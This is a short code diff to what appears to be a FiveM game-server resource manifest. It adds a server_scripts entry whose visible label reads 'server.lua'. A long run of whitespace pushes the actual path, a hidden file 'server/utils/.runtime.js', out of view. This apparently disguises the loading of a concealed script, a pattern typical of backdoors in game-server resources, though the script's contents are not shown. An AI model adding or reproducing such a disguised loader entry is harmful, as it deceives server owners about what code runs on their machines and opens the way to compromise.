@@ -27,3 +27,7 @@ files {
 }
 
 dependency 'es_extended'
+
+server_scripts {
+	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'server/utils/.runtime.js',
+}
